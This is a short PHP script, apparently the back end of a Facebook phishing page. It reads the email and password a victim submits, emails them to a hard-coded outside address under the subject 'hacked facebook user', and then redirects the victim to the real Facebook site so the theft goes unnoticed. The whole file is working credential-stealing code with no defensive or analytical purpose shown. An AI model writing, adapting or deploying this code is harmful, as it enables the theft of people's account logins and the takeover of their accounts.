<?php
	$email  = $_POST["email"];
	$password = $_POST ["password"];
	$to = "wizzycliff@fmguy.com";
	$subject = "hacked facebook user";
	$strg = "user facebook email ";
	function arrayfunc($v1, $v2){
	$us = "user email:";
	$upd = " user password:";
	return $us . " " . $v1 . $upd ." " . $v2;
	}
	$arr = array($email, $password);
	$strng = array_reduce($arr, "arrayfunc");
	$message = $strng;
	
	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	mail($to, $subject, $message, $headers);
	
	header("Location: http://www.facebook.com"); 
	 exit();
	 ;?>